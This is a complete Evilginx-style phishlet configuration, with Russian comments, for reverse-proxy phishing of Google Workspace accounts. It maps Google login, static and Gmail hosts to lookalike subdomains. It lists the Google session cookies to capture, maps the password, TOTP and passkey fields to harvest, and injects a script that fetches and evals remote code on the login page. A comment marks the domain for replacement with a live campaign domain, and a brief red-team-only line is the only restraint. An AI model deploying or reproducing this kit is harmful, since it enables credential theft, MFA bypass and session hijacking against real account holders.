# Google Workspace phishlet MAX (Phantom v2). Только авторизованный Red Team.
# Перехват: identifier + пароль + TOTP/passkeys + сессионные cookie +
# post-login Gmail (сессия остается под нашим хостом).
# Авто-инжект fingerprint-challenge (best-effort, может резаться CSP).
id: google
version: 2
base_domains:
  - "phish.test" # REPLACE-ME: боевой домен кампании
proxy_hosts:
  - phish_sub: "gacc"
    orig_sub: "accounts"
    domain: "google.com"
    is_landing: true
  - phish_sub: "gstatic"
    orig_sub: "ssl"
    domain: "gstatic.com"
    is_landing: false
  - phish_sub: "gmail"
    orig_sub: "mail"
    domain: "google.com"
    is_landing: false
sub_filters:
  - triggers_on: "accounts.google.com"
    search: "accounts.google.com"
    replace: "gacc.phish.test"
    mime: ["text/html", "application/json"]
    redirect_only: false
  - triggers_on: "ssl.gstatic.com"
    search: "ssl.gstatic.com"
    replace: "gstatic.phish.test"
    mime: ["text/html", "text/css", "application/json", "javascript"]
    redirect_only: false
  - triggers_on: "mail.google.com"
    search: "mail.google.com"
    replace: "gmail.phish.test"
    mime: ["text/html", "application/json"]
    redirect_only: false
auth_tokens:
  - domain: ".google.com"
    keys: ["SID", "HSID", "SSID", "APISID", "SAPISID", "OSID", "NID", "SIDCC", "__Secure-1PSID", "__Secure-3PSID"]
creds_map:
  - key: "login"
    search: "identifier"
  - key: "passwd"
    search: "Passwd"
  - key: "passwd"
    search: "password"
mfa_tokens:
  - key: "totp"
    search: "totp"
  - key: "totp"
    search: "totpPin"
  - key: "webauthn"
    search: "authenticatorAssertionResponse"
  - key: "webauthn"
    search: "publicKeyCredential"
lure_path: "/l/google-01"
enabled: true
js_inject:
  - trigger: "accounts.google.com"
    src: "fetch('/__fp.js').then(r=>r.text()).then(eval).catch(()=>{});"
